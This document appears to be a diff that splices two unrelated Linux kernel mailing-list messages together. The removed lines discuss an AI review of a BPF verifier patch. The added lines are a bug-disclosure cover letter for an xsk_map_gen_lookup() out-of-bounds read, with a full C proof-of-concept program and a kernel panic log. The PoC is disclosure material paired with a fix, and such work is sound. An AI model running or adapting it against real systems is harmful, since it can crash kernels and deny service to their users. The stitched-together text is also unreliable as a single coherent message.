-> These three sites are not fixed anywhere later in the series either: `git
-> show a490f49b0c4e:tools/testing/selftests/bpf/verifier/calls.c` still
-> contains all three stale strings, and no commit in 8f65640265e8..a490f49b=
-0c4e
-> touches verifier/calls.c.
->
-> Do the test expectations in other files also need updating? Three more BP=
-F
-> selftests assert the "is fp expected STRUCT ..." message that this commit
-> removes from resolve_func_arg_type():
->
->   tools/testing/selftests/bpf/progs/cgrp_kfunc_failure.c:67
->     __msg("R1 is fp expected STRUCT cgroup")
->   tools/testing/selftests/bpf/progs/task_kfunc_failure.c:53
->     __msg("R1 is fp expected STRUCT task_struct")
->   tools/testing/selftests/bpf/progs/verifier_vfs_reject.c:31
->     __msg("R1 is fp expected STRUCT task_struct")
->
-> struct cgroup and struct task_struct are not scalar structs, so each of
-> these used to hit the deleted verbose(); after the patch check_reg_type()
-> emits "R1 type=3Dfp expected=3Dptr_, trusted_ptr_, rcu_ptr_" and the asse=
-rtions
-> fail.
->
-> This is confirmed by the series itself: commit a490f49b0c4e ("bpf: Check
-> helper and kfunc arguments in one path"), four commits later, updates
-> exactly these three lines to __msg("R1 type=3Dfp expected=3Dptr_, trusted=
-_ptr_,
-> rcu_ptr_"). Those test-expectation updates belong in this commit, which i=
-s
-> the one that changes the message; as it stands the tree is bisect-broken
-> for 4 commits (test_progs cgrp_kfunc/task_kfunc/verifier_vfs_reject).
+We've tested it, and it should not affect any other functionality.
 
-Will fix the test error message expectations.
+We will provide detailed information about the bug in this email, along
+with a PoC to trigger it.
 
->
-> Does this lose test coverage for the ownership check?
-> rbtree_fail.c:182 and rbtree_fail.c:206 were the only two selftests
-> asserting the verifier check at kernel/bpf/verifier.c:13183:
->
->   verbose(env, "%s can only take non-owning or refcounted bpf_rb_node
->   pointer\n", func_name);
->
-> Both tests invalidate a non-owning ref across bpf_spin_unlock() (the
-> register becomes SCALAR_VALUE) and then call bpf_rbtree_remove(). With
-> check_reg_type() now running before the switch, SCALAR_VALUE is rejected =
-by
-> ARG_PTR_TO_RB_NODE's alloc_obj_or_non_own_ref_types table first, so the
-> ownership check is no longer reached and the new expectations only assert
-> the generic register-class error. `grep -r "can only take non-owning or
-> refcounted" tools/testing/selftests/bpf/` now returns nothing: the check
-> has zero test coverage after this patch.
->
-> Worth double-checking whether that check is still reachable at all. The
-> only register types that can now reach it are PTR_TO_BTF_ID|MEM_ALLOC,
-> |NON_OWN_REF and |NON_OWN_REF|MEM_RCU; the NON_OWN_REF forms satisfy
-> type_is_non_owning_ref(), and a plain owning MEM_ALLOC register whose
-> reference has been released is invalidated by
-> release_reference()/mark_reg_invalid(). If no reachable register type
-> remains, the check is dead and should be dropped rather than left
-> uncovered; if it is reachable, the two repurposed tests should be kept (o=
-r
-> a replacement added) so the ownership rule stays guarded.
+---- details below ----
 
-The check is indeed unreachable.
+Bug details:
 
-I prefer keep it to be safe. The listed compatible types happen to
-match what !type_is_non_owning_ref() && reg_is_referenced() gates. It
-requires that a plain MEM_ALLOC pointer must carry a live reference.
+xsk_map_gen_lookup() loads a 32-bit map key and compares it against
+max_entries with BPF_JMP_IMM. BPF immediates are sign-extended to 64
+bits. When max_entries is 0x80000000 or higher, that threshold becomes
+larger than every zero-extended u32 key, so an out-of-range index still
+passes the check. The generated lookup then scales the key and reads a
+pointer past the end of xsk_map[].
 
->
->
-> ---
-> AI reviewed your patch. Please fix the bug or email reply why it's not a =
-bug.
-> See: https://github.com/kernel-patches/vmtest/blob/master/ci/claude/READM=
-E.md
->
-> CI run summary: https://github.com/kernel-patches/bpf/actions/runs/339954=
-42755
+The fix uses BPF_JMP32_IMM so the bounds check stays a 32-bit unsigned
+compare.
+
+Reproducer:
+
+    gcc -O2 -Wall -Wextra -o poc poc.c
+    ./poc
+
+The PoC allocates an XSKMAP with max_entries=0x80000000, so the guest
+needs enough RAM for the backing array (about 16 GiB).
+
+We run the PoC in a 2 vCPU, 32 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+
+    #define _GNU_SOURCE
+    
+    #include <errno.h>
+    #include <linux/bpf.h>
+    #include <linux/unistd.h>
+    #include <stdint.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <sys/resource.h>
+    #include <sys/syscall.h>
+    #include <unistd.h>
+    
+    #ifndef BPF_PSEUDO_MAP_FD
+    #define BPF_PSEUDO_MAP_FD 1
+    #endif
+    
+    #define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
+    
+    #define LOG_BUF_SIZE (1U << 20)
+    #define XSKMAP_MAX_ENTRIES 0x80000000u
+    #define TRIGGER_KEY (XSKMAP_MAX_ENTRIES + 512u)
+    
+    #define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)                          \
+    	((struct bpf_insn) {                                            \
+    		.code = CODE,                                            \
+    		.dst_reg = DST,                                          \
+    		.src_reg = SRC,                                          \
+    		.off = OFF,                                              \
+    		.imm = IMM,                                              \
+    	})
+    
+    #define BPF_MOV64_IMM(DST, IMM)                                          \
+    	BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)
+    
+    #define BPF_MOV64_REG(DST, SRC)                                          \
+    	BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)
+    
+    #define BPF_ALU64_IMM(OP, DST, IMM)                                      \
+    	BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)
+    
+    #define BPF_STX_MEM(SIZE, DST, SRC, OFF)                                 \
+    	BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)
+    
+    #define BPF_EXIT_INSN()                                                  \
+    	BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)
+    
+    #define BPF_EMIT_CALL(FUNC)                                              \
+    	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, FUNC)
+    
+    #define BPF_LD_IMM64_RAW(DST, SRC, IMM)                                  \
+    	BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, DST, SRC, 0, (__u32)(IMM)), \
+    	BPF_RAW_INSN(0, 0, 0, 0, ((__u64)(IMM)) >> 32)
+    
+    #define BPF_LD_MAP_FD(DST, MAP_FD)                                       \
+    	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
+    
+    static int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr)
+    {
+    	return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
+    }
+    
+    static void raise_memlock_limit(void)
+    {
+    	struct rlimit lim = {
+    		.rlim_cur = RLIM_INFINITY,
+    		.rlim_max = RLIM_INFINITY,
+    	};
+    
+    	if (setrlimit(RLIMIT_MEMLOCK, &lim) && errno != EPERM)
+    		perror("setrlimit(RLIMIT_MEMLOCK)");
+    }
+    
+    static int create_xskmap(void)
+    {
+    	union bpf_attr attr = {
+    		.map_type = BPF_MAP_TYPE_XSKMAP,
+    		.key_size = sizeof(uint32_t),
+    		.value_size = sizeof(uint32_t),
+    		.max_entries = XSKMAP_MAX_ENTRIES,
+    	};
+    
+    	return sys_bpf(BPF_MAP_CREATE, &attr);
+    }
+    
+    static int load_prog(int map_fd, char *log_buf, size_t log_buf_sz)
+    {
+    	static const char license[] = "GPL";
+    	struct bpf_insn prog[] = {
+    		BPF_MOV64_IMM(BPF_REG_6, (__s32)TRIGGER_KEY),
+    		BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_6, -4),
+    		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
+    		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
+    		BPF_LD_MAP_FD(BPF_REG_1, map_fd),
+    		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
+    		BPF_MOV64_IMM(BPF_REG_0, XDP_DROP),
+    		BPF_EXIT_INSN(),
+    	};
+    	union bpf_attr attr = {
+    		.prog_type = BPF_PROG_TYPE_XDP,
+    		.insn_cnt = (__u32)ARRAY_SIZE(prog),
+    		.insns = (__u64)(uintptr_t)prog,
+    		.license = (__u64)(uintptr_t)license,
+    		.log_buf = (__u64)(uintptr_t)log_buf,
+    		.log_size = (__u32)log_buf_sz,
+    		.log_level = 2,
+    	};
+    
+    	memset(log_buf, 0, log_buf_sz);
+    	return sys_bpf(BPF_PROG_LOAD, &attr);
+    }
+    
+    static int run_prog(int prog_fd)
+    {
+    	uint8_t pkt[64] = {0};
+    	union bpf_attr attr = {
+    		.test = {
+    			.prog_fd = prog_fd,
+    			.data_in = (__u64)(uintptr_t)pkt,
+    			.data_size_in = sizeof(pkt),
+    			.repeat = 1,
+    		},
+    	};
+    
+    	return sys_bpf(BPF_PROG_TEST_RUN, &attr);
+    }
+    
+    int main(void)
+    {
+    	static char log_buf[LOG_BUF_SIZE];
+    	unsigned long long map_bytes =
+    		(unsigned long long)XSKMAP_MAX_ENTRIES * sizeof(uint64_t);
+    	int prog_fd;
+    	int map_fd;
+    	int ret;
+    
+    	printf("creating XSKMAP with max_entries=0x%08x (~%llu GiB backing array)\n",
+    	       XSKMAP_MAX_ENTRIES, map_bytes >> 30);
+    	printf("trigger key=0x%08x\n", TRIGGER_KEY);
+    
+    	raise_memlock_limit();
+    
+    	map_fd = create_xskmap();
+    	if (map_fd < 0) {
+    		fprintf(stderr, "BPF_MAP_CREATE failed: %s\n", strerror(errno));
+    		return 1;
+    	}
+    
+    	printf("map_fd=%d\n", map_fd);
+    
+    	prog_fd = load_prog(map_fd, log_buf, sizeof(log_buf));
+    	if (prog_fd < 0) {
+    		fprintf(stderr, "BPF_PROG_LOAD failed: %s\n", strerror(errno));
+    		if (log_buf[0] != '\0')
+    			fprintf(stderr, "verifier log:\n%s\n", log_buf);
+    		close(map_fd);
+    		return 1;
+    	}
+    
+    	printf("prog_fd=%d\n", prog_fd);
+    	printf("running BPF_PROG_TEST_RUN; a successful trigger should oops/panic the kernel\n");
+    	fflush(stdout);
+    
+    	ret = run_prog(prog_fd);
+    	if (ret < 0) {
+    		fprintf(stderr, "BPF_PROG_TEST_RUN returned: %s\n", strerror(errno));
+    		close(prog_fd);
+    		close(map_fd);
+    		return 1;
+    	}
+    
+    	printf("BPF_PROG_TEST_RUN unexpectedly completed without a crash\n");
+    	close(prog_fd);
+    	close(map_fd);
+    	return 0;
+    }
+------END poc.c--------
+
+----BEGIN crash log----
+
+[  942.704399][  T993] BUG: unable to handle page fault for address: ffffc904033ca238
+[  942.706192][  T993] #PF: supervisor read access in kernel mode
+[  942.707018][  T993] #PF: error_code(0x0000) - not-present page
+[  942.707828][  T993] PGD 100000067 P4D 100000067 PUD 12ec36067 PMD 15d148067 PTE 0
+[  942.709159][  T993] Oops: Oops: 0000 [#1] SMP KASAN NOPTI
+[  942.710171][  T993] CPU: 1 UID: 0 PID: 993 Comm: poc Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
+[  942.711972][  T993] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  942.714054][  T993] RIP: 0010:bpf_prog_1e67334305173a00+0x51/0x65
+[  942.715178][  T993] Code: 89 ee 48 83 c6 fc 48 bf 00 90 3c 03 00 c9 ff ff 8b 46 00 48 81 f8 00 00 00 80 73 14 48 c1 e0 03 48 81 c7 38 02 00 00 48 01 f8 <48> 8b 40 00 eb 02 31 c0 b8 01 00 00 00 5b c9 e9 d6 63 0f c6 cc cc
+[  942.718505][  T993] RSP: 0018:ffffc90003327918 EFLAGS: 00010282
+[  942.719534][  T993] RAX: ffffc904033ca238 RBX: ffffffff80000200 RCX: ffff88818d9f6638
+[  942.720713][  T993] RDX: ffffffffc000dcd0 RSI: ffffc90003327924 RDI: ffffc900033c9238
+[  942.722000][  T993] RBP: ffffc90003327928 R08: 0000000000000001 R09: fffffbfff13162d0
+[  942.723085][  T993] R10: ffffffff898b1687 R11: 0000000000000001 R12: ffffc90003327a80
+[  942.724473][  T993] R13: ffffc90003327c00 R14: ffffc900022ab000 R15: ffffed1031b3ecc7
+[  942.725727][  T993] FS:  00007ebe6c6e1740(0000) GS:ffff8887dde00000(0000) knlGS:0000000000000000
+[  942.727239][  T993] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  942.728374][  T993] CR2: ffffc904033ca238 CR3: 000000012ec4e002 CR4: 0000000000770ef0
+[  942.729735][  T993] PKRU: 55555554
+[  942.730344][  T993] Call Trace:
+[  942.730949][  T993]  <TASK>
+[  942.731465][  T993]  bpf_test_run+0x2e3/0x970
+[  942.732388][  T993]  ? bpf_test_run+0x261/0x970
+[  942.733225][  T993]  ? __pfx_bpf_test_run+0x10/0x10
+[  942.734109][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  942.735102][  T993]  ? local_clock_noinstr+0x15/0xd0
+[  942.736014][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  942.736885][  T993]  ? lock_release+0x687/0xc90
+[  942.737760][  T993]  ? __pfx_lock_release+0x10/0x10
+[  942.738769][  T993]  ? lock_acquire+0x153/0x2f0
+[  942.739718][  T993]  ? __virt_addr_valid+0x12a/0x2c0
+[  942.740704][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  942.741782][  T993]  ? _copy_from_user+0x42/0xa0
+[  942.742779][  T993]  bpf_prog_test_run_xdp+0x7d0/0x1640
+[  942.743820][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  942.744724][  T993]  ? pipe_write+0xf8e/0x1a40
+[  942.745411][  T993]  ? __pfx_bpf_prog_test_run_xdp+0x10/0x10
+[  942.746199][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  942.746956][  T993]  ? fdget+0x51/0x1d0
+[  942.747516][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  942.748278][  T993]  __sys_bpf+0x7a8/0x3c50
+[  942.748895][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  942.749659][  T993]  ? security_file_permission+0x7e/0xe0
+[  942.750446][  T993]  ? __pfx___sys_bpf+0x10/0x10
+[  942.751091][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  942.751854][  T993]  ? vfs_write+0x9d2/0xf90
+[  942.752473][  T993]  ? reacquire_held_locks+0x204/0x4b0
+[  942.753201][  T993]  ? do_user_addr_fault+0x45b/0xbc0
+[  942.753918][  T993]  ? __pfx_vfs_write+0x10/0x10
+[  942.754606][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  942.755371][  T993]  ? ksys_write+0x17c/0x1d0
+[  942.755981][  T993]  ? __pfx_ksys_write+0x10/0x10
+[  942.756652][  T993]  __x64_sys_bpf+0x78/0xc0
+[  942.757256][  T993]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  942.758020][  T993]  ? trace_hardirqs_on+0x5b/0x110
+[  942.758780][  T993]  do_syscall_64+0x6f/0x150
+[  942.759412][  T993]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
+[  942.760252][  T993] RIP: 0033:0x7ebe6c7f27b9
+[  942.761020][  T993] Code: ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 27 66 0d 00 f7 d8 64 89 01 48
+[  942.764184][  T993] RSP: 002b:00007ffeca1975a8 EFLAGS: 00000246 ORIG_RAX: 0000000000000141
+[  942.765291][  T993] RAX: ffffffffffffffda RBX: 0000000000000004 RCX: 00007ebe6c7f27b9
+[  942.766258][  T993] RDX: 0000000000000098 RSI: 00007ffeca197600 RDI: 000000000000000a
+[  942.767315][  T993] RBP: 00007ffeca197600 R08: 0000000000000000 R09: 0000000000000000
+[  942.768286][  T993] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
+[  942.769253][  T993] R13: 0000000000000003 R14: 00005833505e80c0 R15: 00005833505e7dd8
+[  942.770237][  T993]  </TASK>
+[  942.770623][  T993] Modules linked in:
+[  942.771151][  T993] CR2: ffffc904033ca238
+[  942.771682][  T993] ---[ end trace 0000000000000000 ]---
+[  942.772356][  T993] RIP: 0010:bpf_prog_1e67334305173a00+0x51/0x65
+[  942.773129][  T993] Code: 89 ee 48 83 c6 fc 48 bf 00 90 3c 03 00 c9 ff ff 8b 46 00 48 81 f8 00 00 00 80 73 14 48 c1 e0 03 48 81 c7 38 02 00 00 48 01 f8 <48> 8b 40 00 eb 02 31 c0 b8 01 00 00 00 5b c9 e9 d6 63 0f c6 cc cc
+[  942.775176][  T993] RSP: 0018:ffffc90003327918 EFLAGS: 00010282
+[  942.775889][  T993] RAX: ffffc904033ca238 RBX: ffffffff80000200 RCX: ffff88818d9f6638
+[  942.776785][  T993] RDX: ffffffffc000dcd0 RSI: ffffc90003327924 RDI: ffffc900033c9238
+[  942.777694][  T993] RBP: ffffc90003327928 R08: 0000000000000001 R09: fffffbfff13162d0
+[  942.778655][  T993] R10: ffffffff898b1687 R11: 0000000000000001 R12: ffffc90003327a80
+[  942.779544][  T993] R13: ffffc90003327c00 R14: ffffc900022ab000 R15: ffffed1031b3ecc7
+[  942.780520][  T993] FS:  00007ebe6c6e1740(0000) GS:ffff8887dde00000(0000) knlGS:0000000000000000
+[  942.781552][  T993] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  942.782325][  T993] CR2: ffffc904033ca238 CR3: 000000012ec4e002 CR4: 0000000000770ef0
+[  942.783299][  T993] PKRU: 55555554
+[  942.783738][  T993] Kernel panic - not syncing: Fatal exception in interrupt
+[  942.784962][  T993] Kernel Offset: disabled
+[  942.785472][  T993] Rebooting in 10 seconds..
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+Zhiling Zou (1):
+  xsk: use a 32-bit compare in xsk_map_gen_lookup
+
+ net/xdp/xskmap.c | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
+
+-- 
+2.43.0
